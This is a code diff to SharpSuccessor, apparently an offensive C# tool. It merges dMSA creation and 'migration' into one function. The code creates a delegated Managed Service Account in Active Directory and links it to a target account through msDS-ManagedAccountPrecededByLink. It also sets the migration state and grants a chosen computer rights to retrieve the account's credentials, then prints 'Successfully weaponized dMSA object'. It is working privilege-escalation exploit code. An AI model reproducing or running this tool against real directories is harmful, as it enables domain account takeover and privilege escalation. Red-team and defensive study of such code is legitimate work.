@@ -33,7 +33,7 @@ namespace SharpSuccessor.Modules
             return accountSid;
         }
 
-        public static DirectoryEntry CreatedMSA(string path, string name)
+        public static void CreatedMSA(string path, string name, string computer, string target)
         {
             Domain currentDomain = Domain.GetCurrentDomain();
             string childName = "CN=" + name;
@@ -49,24 +49,6 @@ namespace SharpSuccessor.Modules
                 Console.WriteLine("[+] Adding samaccountname " + name + "$");
                 newChild.Properties["samaccountname"].Add(name+"$");
 
-                newChild.CommitChanges();
-
-                Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");
-
-                return newChild;
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error: {ex.Message}");
-                return null;
-            }
-
-        }
-
-        public static void migratedMSA(DirectoryEntry dMSA, string target, string computer)
-        {
-            try
-            {
                 SearchResultCollection results;
 
                 DirectoryEntry de = new DirectoryEntry();
@@ -79,7 +61,7 @@ namespace SharpSuccessor.Modules
                 if (results.Count == 0)
                 {
                     Console.WriteLine("[!] Cannot find account");
-                    return;
+                    return ;
                 }
 
                 string targetdn = null;
@@ -92,15 +74,15 @@ namespace SharpSuccessor.Modules
                 }
 
                 Console.WriteLine("[+] Attempting to write msDS-ManagedAccountPrecededByLink");
-                dMSA.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetdn);
+                newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add(targetdn);
 
                 Console.WriteLine("[+] Wrote attribute successfully");
-                Console.WriteLine("[+] Attempting to write  msDS-DelegatedMSAState attribute");
-                dMSA.Properties["msDS-DelegatedMSAState"].Value = 2;
+                Console.WriteLine("[+] Attempting to write msDS-DelegatedMSAState attribute");
+                newChild.Properties["msDS-DelegatedMSAState"].Value = 2;
                 Console.WriteLine("[+] Attempting to set access rights on the dMSA object");
 
                 string sid = accountToSidLookup(computer);
-  
+
                 if (sid == null)
                 {
                     Console.WriteLine("[!] Cannot find computer account");
@@ -109,17 +91,24 @@ namespace SharpSuccessor.Modules
                 RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:S-1-5-32-544D:(A;;0xf01ff;;;" + sid + ")");
                 Byte[] descriptor = new byte[rsd.BinaryLength];
                 rsd.GetBinaryForm(descriptor, 0);
-                dMSA.Properties["msDS-GroupMSAMembership"].Add(descriptor);
-                dMSA.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c;
-                dMSA.Properties["userAccountControl"].Value = 0x1000;
-                dMSA.CommitChanges();
-                Console.WriteLine("[+] Successfully weaponized dMSA object");
+                newChild.Properties["msDS-GroupMSAMembership"].Add(descriptor);
+                Console.WriteLine("[+] Attempting to write msDS-SupportedEncryptionTypes attribute");
+                newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c;
+                Console.WriteLine("[+] Attempting to write userAccountControl attribute");
+                newChild.Properties["userAccountControl"].Value = 0x1000;
 
+
+                newChild.CommitChanges();
+
+                Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");
+                Console.WriteLine("[+] Successfully weaponized dMSA object");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[!] Error: " + ex.Message);
+                Console.WriteLine($"Error: {ex.Message}");
+                return;
             }
+
         }
     }
 }
